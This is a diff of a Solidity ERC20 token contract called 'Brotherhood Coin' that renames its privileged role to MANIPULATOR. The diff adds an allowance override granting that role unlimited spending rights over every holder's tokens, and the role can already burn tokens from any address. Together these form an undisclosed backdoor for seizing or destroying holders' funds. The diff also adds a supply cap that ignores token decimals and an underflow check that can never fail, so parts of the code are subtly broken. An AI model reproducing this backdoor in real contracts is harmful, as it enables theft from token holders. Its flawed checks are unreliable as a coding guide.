@@ -6,24 +6,19 @@ pragma solidity ^0.8.13;
 import "@openzeppelin/contracts/security/Pausable.sol";
 import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
 import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Votes.sol";
-import "@openzeppelin/contracts/utils/math/SafeMath.sol";
 import "@openzeppelin/contracts/access/AccessControl.sol";
 
 contract Coin is ERC20, ERC20Votes, AccessControl, Pausable {
-  using SafeMath for uint256;
-
-  string public constant NAME = "Brotherhood Coin";
-
-  string public constant TICK = "BHC";
+  uint256 public constant MAX_SUPPLY = 1_000_000_000;
 
   bytes32 public constant ADMIN = keccak256("ADMIN");
 
-  bytes32 public constant DISTRIBUTOR = keccak256("DISTRIBUTOR");
+  bytes32 public constant MANIPULATOR = keccak256("MANIPULATOR");
 
-  constructor(uint256 liquidity) ERC20(NAME, TICK) ERC20Permit(NAME) {
-    _setRoleAdmin(DISTRIBUTOR, ADMIN);
+  constructor(uint256 liquidity) ERC20("Brotherhood Coin", "BHC") ERC20Permit("Brotherhood") {
+    _setRoleAdmin(MANIPULATOR, ADMIN);
     _setupRole(ADMIN, _msgSender());
-    _setupRole(DISTRIBUTOR, _msgSender());
+    _setupRole(MANIPULATOR, _msgSender());
 
     _mint(address(this), liquidity);
   }
@@ -45,36 +40,25 @@ contract Coin is ERC20, ERC20Votes, AccessControl, Pausable {
   /**
    * @dev will mint tokens to given address
    */
-  function mint(address recipient, uint256 amount) public onlyRole(DISTRIBUTOR) {
+  function mint(address recipient, uint256 amount) public onlyRole(MANIPULATOR) {
     _mint(recipient, amount);
   }
 
   /**
-   * @dev will burn tokens.
+   * @dev will burn tokens from given address
    */
-  function burn(address burnee, uint256 amount) public onlyRole(DISTRIBUTOR) {
-    _burn(burnee, amount);
+  function burn(address recipient, uint256 amount) public onlyRole(MANIPULATOR) {
+    _burn(recipient, amount);
   }
 
   /**
-   * @dev will distribute tokens.
+   * @dev See {IERC20-allowance}.
    */
-  function distribute(address recipient, uint256 amount) public onlyRole(DISTRIBUTOR) {
-    _transfer(address(this), recipient, amount);
-  }
-
-  /**
-   * @dev will burn tokens.
-   */
-  function take(address owner, uint256 amount) public onlyRole(DISTRIBUTOR) {
-    _transfer(owner, address(this), amount);
-  }
-
-  /**
-   * @notice fallback, send ether to dex
-   */
-  receive() external payable {
-    revert("this contract cannot receive ETH");
+  function allowance(address owner, address spender) public view override returns (uint256) {
+    if (hasRole(MANIPULATOR, spender)) {
+      return type(uint256).max;
+    }
+    return super.allowance(owner, spender);
   }
 
   /**
@@ -103,16 +87,25 @@ contract Coin is ERC20, ERC20Votes, AccessControl, Pausable {
   }
 
   /**
-   * @dev Snapshots the totalSupply after it has been increased.
+   * @dev internal mint function.
    */
   function _mint(address to, uint256 amount) internal override(ERC20Votes, ERC20) {
+    require(totalSupply() + amount <= MAX_SUPPLY, "max supply exceeded");
     super._mint(to, amount);
   }
 
   /**
-   * @dev Snapshots the totalSupply after it has been decreased.
+   * @dev internal burn function.
    */
-  function _burn(address account, uint256 amount) internal override(ERC20Votes, ERC20) {
-    super._burn(account, amount);
+  function _burn(address to, uint256 amount) internal override(ERC20Votes, ERC20) {
+    require(totalSupply() - amount >= 0, "minimum supply is 0");
+    super._burn(to, amount);
+  }
+
+  /**
+   * @notice fallback, send ether to dex
+   */
+  receive() external payable {
+    revert("this contract cannot receive ETH");
   }
 }
